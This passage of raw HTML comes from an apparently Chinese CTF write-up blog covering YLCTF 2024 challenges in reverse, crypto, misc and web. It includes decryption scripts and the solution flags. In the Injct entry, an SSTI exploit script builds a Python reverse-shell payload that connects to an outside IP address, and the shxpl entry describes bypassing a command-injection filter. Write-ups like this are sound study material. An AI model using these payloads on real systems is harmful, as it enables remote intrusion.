class="hljs-number">0</span>;init(&amp;s);puts(&quot;input data , end of &#x27;#&#x27;&quot;);scanf(&quot;%s&quot;, &amp;ch);<span class="hljs-keyword">while</span> (ch != <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>        <span class="hljs-keyword">while</span> (ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>            num[i] = ch;scanf(&quot;%c&quot;, &amp;ch);<span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                d = atof(num);push(&amp;s, d); i = <span class="hljs-number">0</span>;break<br>            &#125;<br>        &#125;switch (ch) &#123;<br>        cas<span class="hljs-string">e&#x27;+&#x27;</span>:pop(&amp;s\uff0c &amp; d);pop(&amp;s, &amp;e);push(&amp;s, e + d); break;cas<span class="hljs-string">e&#x27;-&#x27;</span>:pop(&amp;s, &amp;d);pop(&amp;s, &amp;e);push(&amp;s, e - d);break;cas<span class="hljs-string">e&#x27;*&#x27;</span>:pop(&amp;s, &amp;d);pop(&amp;s, &amp;e);push(&amp;s, e * d); break;cas<span class="hljs-string">e&#x27;/&#x27;</span>:pop(&amp;s, &amp;d);pop(&amp;s, &amp;e);push(&amp;s, e / d) break;<br>        &#125;scanf(&quot;%c&quot;, &amp;ch);<br>    &#125;pop(&amp;s, &amp;d); <span class="hljs-keyword">if</span> (d == <span class="hljs-number">125</span>) &#123;<br>        printf(&quot;%s&quot;, getenv(&quot;GZCTF_FLAG&quot;));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Round-1-xorplus"><a href="#Round-1-xorplus" class="headerlink" title="[Round 1] xorplus"></a>[Round 1] xorplus</h5><p>解密RC4 xor</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs pf">def rc4_initialize(key):<br>    <span class="hljs-keyword">state</span> = list(range(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):<br>        j = (j + <span class="hljs-keyword">state</span>[i] + ord(key[i % len(key)]) + <span class="hljs-number">1300</span>) % <span class="hljs-number">256</span><br>        <span class="hljs-keyword">state</span>[i], <span class="hljs-keyword">state</span>[j] = <span class="hljs-keyword">state</span>[j], <span class="hljs-keyword">state</span>[i]<br>    return <span class="hljs-keyword">state</span><br><br><br>def rc4_transform(<span class="hljs-keyword">state</span>, data):<br>    i = j = <span class="hljs-number">0</span><br>    output = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + <span class="hljs-keyword">state</span>[i]) % <span class="hljs-number">256</span><br>        <span class="hljs-keyword">state</span>[i], <span class="hljs-keyword">state</span>[j] = <span class="hljs-keyword">state</span>[j], <span class="hljs-keyword">state</span>[i]<br>        t = <span class="hljs-keyword">state</span>[(<span class="hljs-keyword">state</span>[i] + <span class="hljs-keyword">state</span>[j]) % <span class="hljs-number">256</span>]<br>        output.append(((byte - <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0</span>xFF) ^ t)<br>    return bytes(output)<br><br><br>def main():<br>    secret_key = <span class="hljs-string">&quot;welcometoylctf&quot;</span><br>    encrypted_sequence = [<span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x86, <span class="hljs-number">0</span>x1b, <span class="hljs-number">0</span>x2d, <span class="hljs-number">0</span>x9e, <span class="hljs-number">0</span>x6f, <span class="hljs-number">0</span>x28, <span class="hljs-number">0</span>x33, <span class="hljs-number">0</span>x4b, <span class="hljs-number">0</span>xa1, <span class="hljs-number">0</span>xa2, <span class="hljs-number">0</span>x97, <span class="hljs-number">0</span>xcc, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>x22,<br>                          <span class="hljs-number">0</span>x67, <span class="hljs-number">0</span>x42, <span class="hljs-number">0</span>xf1, <span class="hljs-number">0</span>x30, <span class="hljs-number">0</span>x2d, <span class="hljs-number">0</span>x80, <span class="hljs-number">0</span>x55, <span class="hljs-number">0</span>x4a, <span class="hljs-number">0</span>x1c, <span class="hljs-number">0</span>x6c, <span class="hljs-number">0</span>x76, <span class="hljs-number">0</span>x4b, <span class="hljs-number">0</span>x76, <span class="hljs-number">0</span>x7c, <span class="hljs-number">0</span>x26, <span class="hljs-number">0</span>x9,<br>                          <span class="hljs-number">0</span>x98, <span class="hljs-number">0</span>x8a, <span class="hljs-number">0</span>x49, <span class="hljs-number">0</span>x5c, <span class="hljs-number">0</span>xfd, <span class="hljs-number">0</span>x8, <span class="hljs-number">0</span>x7d, <span class="hljs-number">0</span>x28, <span class="hljs-number">0</span>xf8, <span class="hljs-number">0</span>xc, <span class="hljs-number">0</span>x85, <span class="hljs-number">0</span>xa6]<br><br>    <span class="hljs-keyword">state</span> = rc4_initialize(secret_key)<br>    decrypted_message = rc4_transform(<span class="hljs-keyword">state</span>, encrypted_sequence)<br><br>    print(decrypted_message.decode(&#x27;utf-<span class="hljs-number">8</span>&#x27;))<br><br><br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h5 id="Round-1-Injct"><a href="#Round-1-Injct" class="headerlink" title="[Round 1] Injct"></a>[Round 1] Injct</h5><p>ssti fenjing直接嗦，bash -i弹不了shell，jiaja肯定有python，直接python弹shell</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> functools<br><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload<br><br>url =&quot;http://challenge.yuanloo.com:30166/greet&quot;<br>@functools.lru_cache(<span class="hljs-number">1000</span>)<br>def waf(payload: str):<br>    <span class="hljs-type">time</span>.sleep(<span class="hljs-number">0.01</span>)<br>    resp = requests.post(url, timeout=<span class="hljs-number">10</span>, data=&#123;&quot;name&quot;: payload&#125;)<br>    <span class="hljs-keyword">return</span> &quot;Error&quot; <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text<br><br><br><span class="hljs-keyword">if</span> __name__ == &quot;__main__&quot;:<br>    shell_payload, will_print = exec_cmd_payload(<br>        waf, <span class="hljs-string">&#x27;python3 -c \&#x27;</span><span class="hljs-keyword">import</span> socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.<span class="hljs-keyword">connect</span>((&quot;101.70.156.105&quot;,<span class="hljs-number">27661</span>)); os.dup2(s.fileno(), <span class="hljs-number">0</span>); os.dup2(s.fileno(), <span class="hljs-number">1</span>); os.dup2(s.fileno(), <span class="hljs-number">2</span>); subprocess.<span class="hljs-keyword">call</span>([&quot;/bin/sh&quot;, &quot;-i&quot;])\<span class="hljs-string">&#x27;&#x27;</span><br>    )<br>    print(shell_payload)<br></code></pre></td></tr></table></figure><p><img src="../../../../img/archives/2024-YLCTF/image-20241011231338340.png" alt="image-20241011231338340"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241011231411184.png" alt="image-20241011231411184"></p><h5 id="Round-1-Disal"><a href="#Round-1-Disal" class="headerlink" title="[Round 1] Disal"></a>[Round 1] Disal</h5><p>简单绕过</p><p>a&#x3D;9999999abcdef</p><p>b&#x3D;9999a</p><p><img src="../../../../img/archives/2024-YLCTF/image-20241012011422640.png" alt="image-20241012011422640"></p><h5 id="Round-1-shxpl"><a href="#Round-1-shxpl" class="headerlink" title="[Round 1] shxpl"></a>[Round 1] shxpl</h5><p>过滤了%20|;?等一堆东西，f s t都不行</p><p>%09绕空格过滤，通配符绕禁止s</p><p><img src="../../../../img/archives/2024-YLCTF/image-20241012035751372.png" alt="image-20241012035751372"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241012040139537.png" alt="image-20241012040139537"></p><p>YLCTF{092b6c8d-542a-453d-bfe2-4cd72b902f4c}</p><h3 id="Round-2"><a href="#Round-2" class="headerlink" title="Round 2"></a>Round 2</h3><h4 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h4><h5 id="Round-2-ancat"><a href="#Round-2-ancat" class="headerlink" title="[Round 2] ancat"></a>[Round 2] ancat</h5><p>题目提示叱咤月海鱼鱼猫，Ancat，看加密代码是一个改过的猫脸变换</p><p>网上找一下，再根据变换代码微调一下</p><p><img src="../../../../img/archives/2024-YLCTF/image-20241020165142988.png" alt="image-20241020165142988"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arnold_decode</span>(<span class="hljs-params">image, shuffle_times, a, b</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; decode for rgb image that encoded by Arnold</span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        image: rgb image encoded by Arnold</span><br><span class="hljs-string">        shuffle_times: how many times to shuffle</span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        decode image</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 1:创建新图像</span><br>    decode_image = np.zeros(shape=image.shape)<br><br>    <span class="hljs-comment"># 2：计算N</span><br>    h, w = image.shape[<span class="hljs-number">0</span>], image.shape[<span class="hljs-number">1</span>]<br>    N = h  <span class="hljs-comment"># 或N=w</span><br><br>    <span class="hljs-comment"># 3：遍历像素坐标变换</span><br>    <span class="hljs-keyword">for</span> time <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(shuffle_times):<br>        <span class="hljs-keyword">for</span> ori_x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>            <span class="hljs-keyword">for</span> ori_y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>                <span class="hljs-comment"># 按照公式坐标变换</span><br>                new_x = ((a * b + <span class="hljs-number">1</span>) * ori_x + (-b) * ori_y) % N<br>                new_y = ((-a) * ori_x + ori_y) % N<br>                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]<br>        image = np.copy(decode_image)<br><br>    cv2.imwrite(<span class="hljs-string">&#x27;en_flag.png&#x27;</span>, image, [<span class="hljs-built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> decode_image<br><br><span class="hljs-comment"># 测试解密</span><br>img = cv2.imread(<span class="hljs-string">&quot;en_flag.png&quot;</span>)  <span class="hljs-comment"># 变换的图片</span><br>st = <span class="hljs-number">3</span><br>a = <span class="hljs-number">6</span><br>b = <span class="hljs-number">9</span><br>pic = arnold_decode(img, st, a, b)<br></code></pre></td></tr></table></figure><h5 id="Round-2-rand"><a href="#Round-2-rand" class="headerlink" title="[Round 2] rand"></a>[Round 2] rand</h5><p>ASIS2023原题，稍微改一下出</p><p>给定p，输入p，x，y满足gx+y≡x∗ymodp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>io = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">35268</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    intp3 = io.recvuntil(<span class="hljs-string">b&#x27;The modulus p is: &#x27;</span>)<br>    intp = io.recvuntil(<span class="hljs-string">b&quot;send the base g: \n&quot;</span>)<br>    p=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, intp.decode())[<span class="hljs-number">0</span>])<br>    g = p-<span class="hljs-number">4</span><br>    io.sendline(<span class="hljs-built_in">str</span>(g).encode())<br>    io.recvuntil(<span class="hljs-string">b&#x27;pow(g, x + y, p) = x * y, as x and y:\n&#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&quot;2,&quot;</span>+<span class="hljs-built_in">str</span>(p-<span class="hljs-number">2</span>).encode())<br>    <span class="hljs-built_in">print</span>(p,_)<br><span class="hljs-built_in">print</span>(io.recvall(timeout=<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure><h5 id="Round-2-ezAES"><a href="#Round-2-ezAES" class="headerlink" title="[Round 2] ezAES"></a>[Round 2] ezAES</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br>key = <span class="hljs-string">b&#x27;YLCTF-CRYPTO&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;YLCTF-CRYPTO&#x27;</span>))<br>iv = <span class="hljs-string">b&#x27;YLCTF-IV&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;YLCTF-IV&#x27;</span>))<br>encrypted_data = <span class="hljs-string">b&#x27;\xed\x1d]\xe6p\xb7\xfa\x90/Gu\xf4\xe2\x96\x84\xef90\x92e\xb4\xf8]&quot;\xfc6\xf8\x8cS\xe9b\x19&#x27;</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)<br><span class="hljs-built_in">print</span>(decrypted_data.decode())<br></code></pre></td></tr></table></figure><p>\x00补全空位解密</p><p>input your result:keysauikoydasuicxs<br>YLCTF{c4bca408-a3bf-4b4b-8bb3-be483321319e}</p><h4 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h4><h5 id="Round-2-Trace"><a href="#Round-2-Trace" class="headerlink" title="[Round 2] Trace"></a>[Round 2] Trace</h5><p>文件后藏了base64，分离后cyberchef解出来rar，使用加密Rar5加密，ARCHPR用不了，于是用PasswareKit爆破出密码得到图片，PS拼一下得到flag</p><p><img src="../../../../img/archives/2024-YLCTF/image-20241020161948798.png" alt="image-20241020161948798"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241018174609809.png" alt="image-20241018174609809"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241018193709589.png" alt="image-20241018193709589"></p><h5 id="Round-2-IMGAI"><a href="#Round-2-IMGAI" class="headerlink" title="[Round 2] IMGAI"></a>[Round 2] IMGAI</h5><p>简单预测，看了一下二进制转图大小640,480，pwntools接收直接reshape出来去预测</p><p><img src="../../../../img/archives/2024-YLCTF/image-20241019161031685.png" alt="image-20241019161031685"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241019161433785.png" alt="image-20241019161433785"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MNISTCNN</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(MNISTCNN, <span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.conv1 = nn.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>, kernel_size=<span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>)<br>        <span class="hljs-variable language_">self</span>.pool = nn.MaxPool2d(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>        <span class="hljs-variable language_">self</span>.conv2 = nn.Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>, kernel_size=<span class="hljs-number">5</span>)<br>        <span class="hljs-variable language_">self</span>.fc1 = nn.Linear(<span class="hljs-number">64</span> * <span class="hljs-number">5</span> * <span class="hljs-number">5</span>, <span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.fc2 = nn.Linear(<span class="hljs-number">1024</span>, <span class="hljs-number">10</span>)<br>        <span class="hljs-variable language_">self</span>.relu = nn.ReLU()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = <span class="hljs-variable language_">self</span>.pool(<span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.conv1(x)))<br>        x = <span class="hljs-variable language_">self</span>.pool(<span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.conv2(x)))<br>        x = x.view(-<span class="hljs-number">1</span>, <span class="hljs-number">64</span> * <span class="hljs-number">5</span> * <span class="hljs-number">5</span>)  <span class="hljs-comment"># 展平</span><br>        x = <span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.fc1(x))<br>        x = <span class="hljs-variable language_">self</span>.fc2(x)<br>        <span class="hljs-keyword">return</span> x<br><br><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>, <span class="hljs-number">32061</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">36</span>):<br>    a = p.recvuntil(<span class="hljs-string">b&quot;input num %s \n&quot;</span> % <span class="hljs-built_in">str</span>(i + <span class="hljs-number">1</span>).encode(), timeout=<span class="hljs-number">3</span>)<br><br>    <span class="hljs-comment"># 加载模型权重</span><br>    model = MNISTCNN()<br>    model.load_state_dict(torch.load(<span class="hljs-string">&#x27;model.pth&#x27;</span>, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>)))<br>    model.<span class="hljs-built_in">eval</span>()<br><br>    <span class="hljs-comment"># 定义变换</span><br>    transform = transforms.Compose([<br>        transforms.Resize((<span class="hljs-number">28</span>, <span class="hljs-number">28</span>)),<br>        transforms.ToTensor(),<br>        transforms.Normalize((<span class="hljs-number">0.1307</span>,), (<span class="hljs-number">0.3081</span>,))<br>    ])<br><br>    f = re.findall(<span class="hljs-string">r&quot;[01]+&quot;</span>, a.decode())[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>).write(f)<br>    binary_data = f.strip()<br>    image_array = np.array([<span class="hljs-built_in">int</span>(pixel) <span class="hljs-keyword">for</span> pixel <span class="hljs-keyword">in</span> binary_data])<br>    image_array = image_array.reshape(<span class="hljs-number">480</span>, <span class="hljs-number">640</span>)<br><br>    image = Image.fromarray(np.uint8(image_array * <span class="hljs-number">255</span>), mode=<span class="hljs-string">&#x27;L&#x27;</span>)<br>    image = transform(image).unsqueeze(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        output = model(image)<br>        _, predicted = torch.<span class="hljs-built_in">max</span>(output, <span class="hljs-number">1</span>)<br><br>    b = p.sendline(<span class="hljs-string">b&quot;%s&quot;</span> % <span class="hljs-built_in">str</span>(predicted.item()).encode())<br>    <span class="hljs-built_in">print</span>(a[-<span class="hljs-number">14</span>:], <span class="hljs-string">b&quot;%s&quot;</span> % <span class="hljs-built_in">str</span>(predicted.item()).encode())<br><br>data = p.recvall(timeout=<span class="hljs-number">5</span>)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure><p><img src="../../../../img/archives/2024-YLCTF/image-20241018174518600.png" alt="image-20241018174518600"></p><p>YLCTF{3c85be81-36a1-4aaa-bf93-83ec6faae780}</p><h4 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h4><h5 id="Round-2-ezwasm"><a href="#Round-2-ezwasm" class="headerlink" title="[Round 2] ezwasm"></a>[Round 2] ezwasm</h5><p>建议放Cry&#x2F;Misc，CyberCHef直接嗦了</p><p><img src="../../../../img/archives/2024-YLCTF/image-20241018221201707.png" alt="image-20241018221201707"></p><h5 id="Round-2-三点几啦饮茶先"><a href="#Round-2-三点几啦饮茶先" class="headerlink" title="[Round 2] 三点几啦饮茶先"></a>[Round 2] 三点几啦饮茶先</h5><p>ez，直接网上找个解密脚本让AI微调</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">tea_dec</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> </span>&#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];  <span class="hljs-comment">// v0、v1分别是密文的左、右半部分</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">289739961</span>;     <span class="hljs-comment">// 根据之前的加密逻辑，delta值为289739961</span><br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">40</span> * delta;      <span class="hljs-comment">// 加密轮数为40轮，因此解密时sum是40倍的delta</span><br>    <span class="hljs-type">int</span> i;                          <span class="hljs-comment">// 在循环外部声明变量i</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;      <span class="hljs-comment">// tea加密进行40轮</span><br>        <span class="hljs-comment">// 根据加密时的顺序颠倒下面3行的顺序，将加法改为减法（异或部分都是整体，不用管），就是逆向解密过程</span><br>        v1 -= (((v0 &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * v0)) + v0) ^ (k[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>] + sum);<br>        sum -= delta;<br>        v0 -= (((v1 &gt;&gt; <span class="hljs-number">3</span>) ^ (<span class="hljs-number">4</span> * v1)) + v1) ^ (k[sum &amp; <span class="hljs-number">3</span>] + sum);<br>    &#125;<br>    <span class="hljs-comment">// 解密后的内容要还给v数组</span><br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// k为加解密密钥，4个32位无符号整数，密钥长度为128位</span><br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">4097</span>, <span class="hljs-number">8194</span>, <span class="hljs-number">12291</span>, <span class="hljs-number">16388</span>&#125;;  <span class="hljs-comment">// 根据之前的加密逻辑，密钥为v9数组的值</span><br>    <span class="hljs-comment">// v为要加解密的数据，两个32位无符号整数</span><br>    <span class="hljs-comment">// 否则会报类型转换的错误，但是单独给每个元素赋值就可以，不清楚原因，但是也算学到一招，避免以后遇到这种问题没法解决</span><br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1913208188</span>, <span class="hljs-number">-1240730499</span>&#125;;  <span class="hljs-comment">// 根据之前的加密结果，密文为1913208188和-1240730499</span><br><br>    <span class="hljs-comment">// 解密</span><br>    <span class="hljs-built_in">tea_dec</span>(v, k);<br><br>    <span class="hljs-comment">// 打印解密后的结果</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u\n%u\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>926048868<br>1667512119</p><p>success give you flag YLCTF{0fb86ed4-318a-4567-b83c-c01d5529eaea}</p><h3 id="Round-3"><a href="#Round-3" class="headerlink" title="Round 3"></a>Round 3</h3><h4 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h4><h5 id="Round-3-Blackdoor"><a href="#Round-3-Blackdoor" class="headerlink" title="[Round 3] Blackdoor"></a>[Round 3] Blackdoor</h5><p>D盾一把嗦</p><p><img src="../../../../img/archives/2024-YLCTF/image-20241023161635764.png" 